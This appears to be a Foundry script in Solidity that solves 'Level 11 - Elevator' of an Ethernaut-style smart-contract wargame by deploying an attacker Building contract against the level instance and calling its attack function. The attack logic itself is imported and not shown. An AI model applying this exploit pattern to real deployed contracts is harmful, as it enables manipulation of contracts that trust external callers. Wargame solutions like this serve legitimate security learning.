// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {HelperFunctions} from "script/HelperFunctions.s.sol";
import {Building} from "../src/Level11.sol";

// ================================================================
// │                        LEVEL 11 - ELEVATOR                   │
// ================================================================
contract Exploit is Script, HelperFunctions {
    function run() public {
        address targetContractAddress = getInstanceAddress();

        vm.startBroadcast();
        Building building = new Building(targetContractAddress);
        building.attack();
        vm.stopBroadcast();
    }
}
